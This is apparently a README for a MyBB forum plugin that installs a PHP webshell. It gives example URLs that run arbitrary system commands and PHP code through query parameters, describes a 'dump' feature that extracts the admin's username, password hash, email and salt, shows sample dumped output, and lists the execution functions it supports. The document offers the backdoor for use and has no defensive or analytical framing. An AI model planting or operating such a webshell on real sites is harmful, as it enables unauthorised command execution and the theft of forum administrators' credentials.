# MyBB-Shell-Plugin
MyBB Webshell Plugin

A plugin coded to be compatible with any version of MyBB *


A simple PHP webshell:
  After Activation:
    http://127.0.0.1/mybb/?cmd=FUNCTION&command=COMMAND
    
  Examples:
  
    http://127.0.0.1/mybb/?cmd=shell_exec&command=whoami
    http://127.0.0.1/mybb/?cmd=eval&command=phpinfo();
    
Features:

  http://127.0.0.1/mybb/?cmd=dump
  
  Admin Dumped:
1:admin:3052f668213bed7aef217c38683b94ab:admin@admin.com:aFmLOO6M

Current functions:

- shell_exec,
- passthru,
- exec,
- system,
- popen,
- proc_open,
- eval,
- assert,
- pcntl_exec,
- ``
  
